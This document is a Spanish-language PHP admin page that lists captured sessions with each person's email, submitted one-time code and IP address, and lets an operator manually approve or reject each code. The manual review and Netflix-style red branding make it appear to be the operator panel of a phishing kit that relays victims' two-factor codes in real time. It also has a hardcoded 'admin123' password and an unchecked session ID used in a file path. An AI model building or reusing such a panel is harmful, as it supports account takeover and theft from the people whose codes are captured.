<?php
// Panel de administración para verificar OTPs

// Contraseña de administrador
$admin_password = 'admin123';

// Verificar autenticación
session_start();
$authenticated = false;

if (isset($_POST['password']) && $_POST['password'] === $admin_password) {
    $_SESSION['admin_authenticated'] = true;
}

if (isset($_SESSION['admin_authenticated']) && $_SESSION['admin_authenticated'] === true) {
    $authenticated = true;
}

// Manejar acciones
if ($authenticated && isset($_POST['action'])) {
    $action = $_POST['action'];
    $session_id = $_POST['session_id'] ?? '';
    
    if ($action === 'verify' && !empty($session_id)) {
        $is_valid = isset($_POST['is_valid']) ? (bool)$_POST['is_valid'] : false;
        
        // Verificar si existe el archivo de sesión
        $session_file = __DIR__ . "/sessions/{$session_id}.json";
        
        if (file_exists($session_file)) {
            // Leer el archivo de sesión
            $session_data = json_decode(file_get_contents($session_file), true);
            
            // Actualizar el estado de verificación
            $session_data['otp_verified'] = $is_valid;
            $session_data['manually_verified'] = true;
            $session_data['verification_time'] = date('Y-m-d H:i:s');
            
            // Guardar los cambios
            file_put_contents($session_file, json_encode($session_data, JSON_PRETTY_PRINT));
            
            // Redirigir para evitar reenvío del formulario
            header('Location: ' . $_SERVER['PHP_SELF'] . '?verified=' . ($is_valid ? 'true' : 'false'));
            exit;
        }
    }
}

// Obtener lista de sesiones con OTP pendiente
$pending_otps = [];
if ($authenticated) {
    $sessions_dir = __DIR__ . '/sessions';
    if (is_dir($sessions_dir)) {
        $files = scandir($sessions_dir);
        foreach ($files as $file) {
            if ($file !== '.' && $file !== '..' && pathinfo($file, PATHINFO_EXTENSION) === 'json') {
                $session_data = json_decode(file_get_contents($sessions_dir . '/' . $file), true);
                
                // Verificar si tiene OTP enviado pero no verificado
                if (isset($session_data['otp_submitted']) && $session_data['otp_submitted'] === true &&
                    (!isset($session_data['manually_verified']) || $session_data['manually_verified'] !== true)) {
                    $pending_otps[] = $session_data;
                }
            }
        }
    }
    
    // Ordenar por fecha de actualización (más reciente primero)
    usort($pending_otps, function($a, $b) {
        $time_a = strtotime($a['updated_at'] ?? '0');
        $time_b = strtotime($b['updated_at'] ?? '0');
        return $time_b - $time_a;
    });
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel de Administración OTP</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #e50914;
            margin-bottom: 20px;
        }
        .login-form {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f9f9f9;
            border-radius: 5px;
        }
        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button, .btn {
            background-color: #e50914;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover, .btn:hover {
            background-color: #b2070f;
        }
        .otp-card {
            background-color: #f9f9f9;
            border-left: 4px solid #e50914;
            padding: 15px;
            margin-bottom: 15px;
            border-radius: 4px;
        }
        .otp-info {
            margin-bottom: 10px;
        }
        .otp-actions {
            display: flex;
            gap: 10px;
        }
        .btn-success {
            background-color: #28a745;
        }
        .btn-success:hover {
            background-color: #218838;
        }
        .btn-danger {
            background-color: #dc3545;
        }
        .btn-danger:hover {
            background-color: #c82333;
        }
        .alert {
            padding: 10px 15px;
            margin-bottom: 15px;
            border-radius: 4px;
        }
        .alert-success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .alert-danger {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .no-otps {
            background-color: #f9f9f9;
            padding: 20px;
            text-align: center;
            border-radius: 4px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Panel de Administración OTP</h1>
        
        <?php if (!$authenticated): ?>
            <!-- Formulario de login -->
            <div class="login-form">
                <h2>Iniciar sesión</h2>
                <form method="post" action="">
                    <div>
                        <label for="password">Contraseña:</label>
                        <input type="password" id="password" name="password" required>
                    </div>
                    <button type="submit">Acceder</button>
                </form>
            </div>
        <?php else: ?>
            <!-- Panel de administración -->
            <?php if (isset($_GET['verified'])): ?>
                <?php if ($_GET['verified'] === 'true'): ?>
                    <div class="alert alert-success">
                        OTP verificado correctamente.
                    </div>
                <?php else: ?>
                    <div class="alert alert-danger">
                        OTP marcado como inválido.
                    </div>
                <?php endif; ?>
            <?php endif; ?>
            
            <h2>OTPs pendientes de verificación</h2>
            
            <?php if (empty($pending_otps)): ?>
                <div class="no-otps">
                    <p>No hay OTPs pendientes de verificación.</p>
                </div>
            <?php else: ?>
                <?php foreach ($pending_otps as $otp): ?>
                    <div class="otp-card">
                        <div class="otp-info">
                            <p><strong>Email:</strong> <?php echo htmlspecialchars($otp['email'] ?? 'N/A'); ?></p>
                            <p><strong>OTP:</strong> <?php echo htmlspecialchars($otp['otp_code'] ?? 'N/A'); ?></p>
                            <p><strong>IP:</strong> <?php echo htmlspecialchars($otp['ip'] ?? 'N/A'); ?></p>
                            <p><strong>Fecha:</strong> <?php echo htmlspecialchars($otp['updated_at'] ?? 'N/A'); ?></p>
                        </div>
                        <div class="otp-actions">
                            <form method="post" action="">
                                <input type="hidden" name="action" value="verify">
                                <input type="hidden" name="session_id" value="<?php echo htmlspecialchars($otp['session_id']); ?>">
                                <input type="hidden" name="is_valid" value="1">
                                <button type="submit" class="btn btn-success">Aprobar OTP</button>
                            </form>
                            
                            <form method="post" action="">
                                <input type="hidden" name="action" value="verify">
                                <input type="hidden" name="session_id" value="<?php echo htmlspecialchars($otp['session_id']); ?>">
                                <input type="hidden" name="is_valid" value="0">
                                <button type="submit" class="btn btn-danger">Rechazar OTP</button>
                            </form>
                        </div>
                    </div>
                <?php endforeach; ?>
            <?php endif; ?>
            
            <p><a href="admin.php" style="color: #e50914;">Volver al panel principal</a></p>
        <?php endif; ?>
    </div>
</body>
</html>